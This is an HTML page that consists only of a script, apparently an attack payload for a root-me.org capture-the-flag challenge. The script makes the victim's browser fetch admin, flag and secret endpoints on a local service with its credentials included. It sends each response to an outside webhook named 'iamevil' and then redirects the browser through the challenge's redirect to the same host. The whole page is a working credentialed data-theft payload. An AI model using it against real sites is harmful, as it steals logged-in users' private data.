<!DOCTYPE html>
<html>
<head>
    <title>Admin Access</title>
</head>
<body>
    <script>
        // Check potential admin endpoints
        const endpoints = [
            '/admin',
            '/dashboard',
            '/flags',
            '/flag',
            '/settings',
            '/secret'
        ];
        
        // Try each endpoint
        endpoints.forEach(endpoint => {
            fetch('http://127.0.0.1:58039' + endpoint, {
                credentials: 'include'
            })
            .then(response => response.text())
            .then(data => {
                // Send the content to our webhook
                fetch('https://iamevil.free.beeceptor.com/endpoint?path=' + encodeURIComponent(endpoint) + '&data=' + encodeURIComponent(data))
                .catch(() => {});
            })
            .catch(() => {});
        });
        
        // Ensure we get a redirect regardless
        setTimeout(() => {
            window.location = 'http://challenge01.root-me.org:58039/redirect?url=https://iamevil.free.beeceptor.com/checked_admin_pages';
        }, 2000);
    </script>
</body>
</html>
